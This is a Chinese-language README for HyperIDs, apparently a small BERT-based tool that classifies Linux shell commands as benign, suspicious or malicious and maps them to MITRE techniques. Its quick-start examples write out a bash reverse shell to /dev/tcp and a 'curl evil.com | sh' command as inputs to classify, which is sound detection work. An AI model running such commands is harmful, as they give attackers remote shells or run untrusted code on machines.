# HyperIDs

Linux shell 命令威胁分类器。给定一条 shell 命令，输出：
- **verdict**（互斥 3 类）：benign / suspicious / malicious
- **action**（多标签 28 类）：download、reverse_shell、ransomware …
- **MITRE** tactic/technique：由 action 规则表确定性推导

模型 = GLiClass 框架 + `prajjwal1/bert-small`（29.8M，≤30M）；部署为**静态单二进制**（RSS ~38 MiB）。

## 目录结构

```
hyperids/        核心包：schema / 训练 / 评估 / 推理 / 数据构建 / 公共客户端
  data/          上游数据准备（拉取 / 合成 / 打标，可选重跑）
versions/        历史版本归档：v1_electra_199 / v2_gliclass_edge_199 / v3_bert_132
                 + experiments/（被否决的 KD 蒸馏、红队）
deploy/          部署：ONNX 导出 / INT8 量化 / C 单二进制（c_runtime/）
tools/           工具：bench / 外部评测 / schema 校验
docs/            文档：模型卡 / 训练链路 / 数据链路 / 进度 / 外部评测
dataset/         数据：corpus（LFS 同步）+ external_eval + 训练集分片
scripts/         Lightning GPU 训练编排 / 样本同步
configs/         阈值等配置
```

## 快速开始

```bash
# 推理（本地 checkpoint）
python -m hyperids.predict "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

# 从 corpus 重建训练集
make data

# 训练 / 评估 / 导出 / 部署
make train && make eval && make export && make release
```

## 发布单二进制

```bash
curl -fsSL https://github.com/ohmydevelop/hyperids/releases/latest/download/install.sh | sh
hyperids 'curl http://evil.com/x.sh | sh'
```

详见 `deploy/c_runtime/README.md` 与 `docs/TRAINING.md`。

## 模型指标（test 5,978）

| 指标 | fp32 | INT8 |
|---|---|---|
| verdict_acc | 0.917 | 0.919 |
| action micro-F1 | 0.909 | 0.910 |

完整模型卡见 `docs/MODEL_CARD.md`。
